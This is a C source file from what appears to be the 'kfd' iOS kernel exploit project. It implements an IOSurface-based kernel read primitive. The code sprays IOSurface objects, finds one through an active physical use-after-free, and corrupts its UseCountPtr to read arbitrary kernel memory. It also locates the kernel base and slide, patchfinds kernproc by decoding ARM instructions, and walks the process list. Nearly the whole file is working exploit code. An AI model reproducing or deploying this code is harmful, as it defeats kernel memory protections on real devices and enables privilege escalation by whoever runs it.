//
//  kread_IOSurface.c
//  kfd
//
//  Created by Lars Fröder on 29.07.23.
//

#include "kread_IOSurface.h"

void kread_IOSurface_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = 0x4000;
    kfd->kread.krkw_object_size = 0x400; //estimate

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id) * (sizeof(struct iosurface_obj)));
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);
    
    // For some reson on some devices calling get_surface_client crashes while the PUAF is active
    // So we just call it here and keep the reference
    g_surfaceConnect = get_surface_client();
}

void kread_IOSurface_allocate(struct kfd* kfd, uint64_t id)
{
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
    
    IOSurfaceFastCreateArgs args = {0};
    args.IOSurfaceAddress = 0;
    args.IOSurfaceAllocSize =  (uint32_t)id + 1;

    args.IOSurfacePixelFormat = IOSURFACE_MAGIC;

    objectStorage[id].port = create_surface_fast_path(kfd, g_surfaceConnect, &objectStorage[id].surface_id, &args);
}

bool kread_IOSurface_search(struct kfd* kfd, uint64_t object_uaddr)
{
    uint32_t magic = dynamic_uget(IOSurface, PixelFormat, object_uaddr);
    if (magic == IOSURFACE_MAGIC) {
        uint64_t id = dynamic_uget(IOSurface, AllocSize, object_uaddr) - 1;
        kfd->kread.krkw_object_id = id;
        return true;
    }
    return false;
}

void kread_IOSurface_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
{
    volatile uint32_t* type_base = (volatile uint32_t*)(uaddr);
    uint64_t type_size = ((size) / (sizeof(uint32_t)));
    for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {
        uint32_t type_value = kread_IOSurface_kread_u32(kfd, kaddr + (type_offset * sizeof(uint32_t)));
        type_base[type_offset] = type_value;
    }
}

void get_kernel_section(struct kfd* kfd, uint64_t kernel_base, const char *segment, const char *section, uint64_t *addr_out, uint64_t *size_out)
{
    struct mach_header_64 kernel_header;
    kread_kfd((uint64_t)kfd, kernel_base, &kernel_header, sizeof(kernel_header));
    
    uint64_t cmdStart = kernel_base + sizeof(kernel_header);
    uint64_t cmdEnd = cmdStart + kernel_header.sizeofcmds;
    
    uint64_t cmdAddr = cmdStart;
    for(int ci = 0; ci < kernel_header.ncmds && cmdAddr <= cmdEnd; ci++)
    {
        struct segment_command_64 cmd;
        kread_kfd((uint64_t)kfd, cmdAddr, &cmd, sizeof(cmd));
        
        if(cmd.cmd == LC_SEGMENT_64)
        {
            uint64_t sectStart = cmdAddr + sizeof(cmd);
            bool finished = false;
            for(int si = 0; si < cmd.nsects; si++)
            {
                uint64_t sectAddr = sectStart + si * sizeof(struct section_64);
                struct section_64 sect;
                kread_kfd((uint64_t)kfd, sectAddr, &sect, sizeof(sect));
                
                if (!strcmp(cmd.segname, segment) && !strcmp(sect.sectname, section)) {
                    *addr_out = sect.addr;
                    *size_out = sect.size;
                    finished = true;
                    break;
                }
            }
            if (finished) break;
        }
        
        cmdAddr += cmd.cmdsize;
    }
}

// credits to pongoOS KPF for the next two functions
static inline int64_t sxt64(int64_t value, uint8_t bits)
{
    value = ((uint64_t)value) << (64 - bits);
    value >>= (64 - bits);
    return value;
}

static inline int64_t adrp_off(uint32_t adrp)
{
    return sxt64((((((uint64_t)adrp >> 5) & 0x7ffffULL) << 2) | (((uint64_t)adrp >> 29) & 0x3ULL)) << 12, 33);
}

uint64_t patchfind_kernproc(struct kfd* kfd, uint64_t kernel_base)
{
    //uint64_t kernel_slide = kernel_base - KERNEL_BASE_ADDRESS;
    // ^ only for debugging
    
    uint64_t textexec_text_addr = 0, textexec_text_size = 0;
    get_kernel_section(kfd, kernel_base, "__TEXT_EXEC", "__text", &textexec_text_addr, &textexec_text_size);
    assert(textexec_text_addr != 0 && textexec_text_size != 0);
    
    uint64_t textexec_text_addr_end = textexec_text_addr + textexec_text_size;
    
    // For some reason "mov w8, #0x1006" always follows a kernproc reference, we take advantage of that here
    
    uint32_t movSearch = 0x528200C8; // "mov w8, #0x1006"
    uint64_t movKaddr = 0;
    
    // this patchfinder is slow af, we start 0x180000 in to speed it up because the reference we're looking for is usually in this area
#define FAST_START ((ischip() <= 8) ? 0x100000 : 0x180000 )
    
    uint64_t instrForward = textexec_text_addr + FAST_START;
    uint64_t instrBackward = instrForward;
    
    while (true) {
        if (instrForward < textexec_text_addr_end) {
            uint32_t instr = 0;
            kread_kfd((uint64_t)kfd, instrForward, &instr, sizeof(instr));
            if (instr == movSearch) {
                movKaddr = instrForward;
                break;
            }
            instrForward += 4;
        }
        if (instrBackward > textexec_text_addr) {
            uint32_t instr = 0;
            kread_kfd((uint64_t)kfd, instrBackward, &instr, sizeof(instr));
            if (instr == movSearch) {
                movKaddr = instrBackward;
                break;
            }
            instrBackward -= 4;
        }
    }
    
    // okay this is fucked
    // there are two adrp, ldr's following but the problem is that they're apart (sometimes) and only one of them is kernproc
    // one ldr is going into some obscure "D<>" register, we need to filter that out, then get the x register of the other one
    // then seek back for the adrp that loaded a value into this register, then we need to decode the adrp and the ldr
    
    uint64_t ldrKaddr = 0;
    uint32_t ldrInstr = 0;
    for (uint32_t i = 0; i < 20; i++) {
        uint64_t addr = movKaddr+(4*i);
        uint32_t instr = 0;
        kread_kfd((uint64_t)kfd, addr, &instr, sizeof(instr));
        if ((instr & 0xFFC00000) == 0xF9400000) { // check if ldr (we automatically filter the shit one out here)
            ldrKaddr = addr;
            ldrInstr = instr;
            break;
        }
    }
    
    //printf("ldrKaddr: 0x%llx\n", ldrKaddr - kernel_slide);
    //printf("ldrInstr: 0x%x\n", ldrInstr);
    
    uint32_t ldrReg = (ldrInstr & 0x3E0) >> 5;
    //printf("ldrReg: %d\n", ldrReg);
    
    uint32_t adrpFind = 0x90000000 | ldrReg;
    uint32_t adrpFindMask = 0x9F00001F;
    
    uint64_t adrpKaddr = 0;
    uint32_t adrpInstr = 0;
    for (uint32_t i = 0; i < 30; i++) {
        uint64_t addr = ldrKaddr-(4*i);
        uint32_t instr = 0;
        kread_kfd((uint64_t)kfd, addr, &instr, sizeof(instr));
        if ((instr & adrpFindMask) == adrpFind) {
            adrpKaddr = addr;
            adrpInstr = instr;
            break;
        }
    }
    
    // We got everything we need! Now just decode and get kernproc
    
    int64_t adrp_imm = adrp_off(adrpInstr);
    uint32_t ldr_imm = ((ldrInstr & 0x003FFC00) >> 9) * 4;
    
    //printf("adrp_imm: %lld\n", adrp_imm);
    //printf("ldr_imm: 0x%X\n", ldr_imm);
    //printf("adrpKaddr page: 0x%llX\n", (adrpKaddr - kernel_slide) & ~0xfff);
    
    return ((adrpKaddr & ~0xfff) + adrp_imm) + ldr_imm;
}

void kread_IOSurface_find_proc(struct kfd* kfd)
{
    uint64_t textPtr = unsign_kaddr(dynamic_uget(IOSurface, isa, kfd->kread.krkw_object_uaddr));
    
    struct mach_header_64 kernel_header;
    
    uint64_t kernel_base = 0;

    for (uint64_t page = textPtr & ~PAGE_MASK; true; page -= 0x4000) {
        struct mach_header_64 candidate_header;
        kread_kfd((uint64_t)kfd, page, &candidate_header, sizeof(candidate_header));
        
        if (candidate_header.magic == 0xFEEDFACF) {
            kernel_header = candidate_header;
            kernel_base = page;
            break;
        }
    }
    if (kernel_header.filetype == 0xB) {
        // if we found 0xB, rescan forwards instead
        // don't ask me why (<=A10 specific issue)
        for (uint64_t page = textPtr & ~PAGE_MASK; true; page += 0x4000) {
            struct mach_header_64 candidate_header;
            kread_kfd((uint64_t)kfd, page, &candidate_header, sizeof(candidate_header));
            if (candidate_header.magic == 0xFEEDFACF) {
                kernel_header = candidate_header;
                kernel_base = page;
                break;
            }
        }
    }
    uint64_t kernel_slide = kernel_base - KERNEL_BASE_ADDRESS;
    kfd->info.kernel.kernel_slide = kernel_slide;
    print_x64(kfd->info.kernel.kernel_slide);
    uint64_t kernproc = patchfind_kernproc(kfd, kernel_base);
    
    uint64_t proc_kaddr = 0;
    kread_kfd((uint64_t)kfd, kernproc, &proc_kaddr, sizeof(proc_kaddr));
    proc_kaddr = unsign_kaddr(proc_kaddr);
    kfd->info.kernel.kernel_proc = proc_kaddr;
    
    while (proc_kaddr != 0) {
        int32_t pid = dynamic_kget(proc, p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kernel.current_proc = proc_kaddr;
            break;
        }

        proc_kaddr = dynamic_kget(proc, p_list_le_prev, proc_kaddr);
    }
}

void kread_IOSurface_deallocate(struct kfd* kfd, uint64_t id)
{
    if (id != kfd->kread.krkw_object_id) {
        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
        release_surface(objectStorage[id].port, objectStorage[id].surface_id);
    }
}

void kread_IOSurface_free(struct kfd* kfd)
{
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
    struct iosurface_obj krwObject = objectStorage[kfd->kread.krkw_object_id];
    release_surface(krwObject.port, krwObject.surface_id);
}

/*
 * 32-bit kread function.
 */

uint32_t kread_IOSurface_kread_u32(struct kfd* kfd, uint64_t kaddr)
{
    uint64_t iosurface_uaddr = kfd->kread.krkw_object_uaddr;
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
    struct iosurface_obj krwObject = objectStorage[kfd->kread.krkw_object_id];
    
    uint64_t backup = dynamic_uget(IOSurface, UseCountPtr, iosurface_uaddr);
    dynamic_uset(IOSurface, UseCountPtr, iosurface_uaddr, kaddr - dynamic_offsetof(IOSurface, ReadDisplacement));
    
    uint32_t read32 = 0;
    iosurface_get_use_count(krwObject.port, krwObject.surface_id, &read32);
    
    dynamic_uset(IOSurface, UseCountPtr, iosurface_uaddr, backup);
    return read32;
}
